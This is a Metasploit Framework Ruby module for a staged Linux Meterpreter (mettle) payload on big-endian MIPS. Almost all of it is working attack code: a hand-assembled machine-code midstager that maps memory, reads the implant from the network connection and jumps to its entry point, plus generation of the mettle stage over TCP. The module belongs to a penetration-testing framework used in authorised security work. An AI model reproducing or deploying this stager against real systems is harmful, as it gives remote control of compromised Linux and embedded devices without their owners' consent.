##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/base/sessions/meterpreter_mipsbe_linux'
require 'msf/base/sessions/meterpreter_options'
require 'msf/base/sessions/mettle_config'
require 'rex/elfparsey'

module MetasploitModule
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Linux Meterpreter',
        'Description' => 'Inject the mettle server payload (staged)',
        'Author'      => [
          'Adam Cammack <adam_cammack[at]rapid7.com>'
        ],
        'Platform'    => 'linux',
        'Arch'        => ARCH_MIPSBE,
        'License'     => MSF_LICENSE,
        'Session'     => Msf::Sessions::Meterpreter_mipsbe_Linux
      )
    )
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
    elf.elf_header.e_entry
  end

  def handle_intermediate_stage(conn, payload)
    entry_offset = elf_ep(payload)
    entry_h = entry_offset >> 16
    entry_l = entry_offset & 0x0000ffff

    size = payload.length
    size_h = size >> 16
    size_l = size & 0x0000ffff

    midstager = [
      0x00002021,                # move  a0,zero
      (0x3c05 << 16) | size_h,   # lu    a1,SIZE[31:16]
      (0x34a5 << 16) | size_l,   # ori   a1,a1,SIZE[15:0]
      0x24060007,                # li    a2,7
      0x24070802,                # li    a3,34
      0xafa00010,                # sw    zero,16(sp)
      0xafa00014,                # sw    zero,20(sp)
      0x24020ffa,                # li    v0,4090
      0x0000000c,                # syscall
      0x00a03021,                # move  a2,a1
      0x00402821,                # move  a1,v0
      0x02402021,                # move  a0,s2
      0x24070100,                # li    a3,256
      0x2402104f,                # li    v0,4175
      0x0000000c,                # syscall
      0x2401fff8,                # li    at,-8
      0x03a1e824,                # and   sp,sp,at
      0x3c0c6d00,                # lui   t4,0x6d00
      0x358c006d,                # ori   t4,t4,0x6d
      0xafac002c,                # sw    t4,44(sp)
      0x240d0002,                # li    t5,2
      0xafad0000,                # sw    t5,0(sp)
      0x23ae002c,                # addi  t6,sp,44
      0xafae0004,                # sw    t6,4(sp)
      0xafb20008,                # sw    s2,8(sp)
      0xafa0000c,                # sw    zero,12(sp)
      0xafa00010,                # sw    zero,16(sp)
      0x240f0007,                # li    t7,7
      0xafaf0014,                # sw    t7,20(sp)
      0xafa50018,                # sw    a1,24(sp)
      0x24180006,                # li    t8,6
      0xafb8001c,                # sw    t8,28(sp)
      0x24191000,                # li    t9,4096
      0xafb90020,                # sw    t9,32(sp)
      0xafa00024,                # sw    zero,36(sp)
      0xafa00028,                # sw    zero,40(sp)
      (0x3c10 << 16) | entry_h,  # lui   s0,ENTRY[31:16]
      (0x3610 << 16) | entry_l,  # ori   s0,s0,ENTRY[15:0]
      0x02058020,                # add   s0,s0,a1
      0x02000008,                # jr    s0
      0
    ].pack('N*')

    vprint_status("Transmitting intermediate stager...(#{midstager.length} bytes)")
    conn.put(midstager) == midstager.length
  end

  def generate_stage(opts = {})
    MetasploitPayloads::Mettle.new('mips-linux-muslsf',
      generate_config(opts.merge({scheme: 'tcp'}))).to_binary :process_image
  end
end
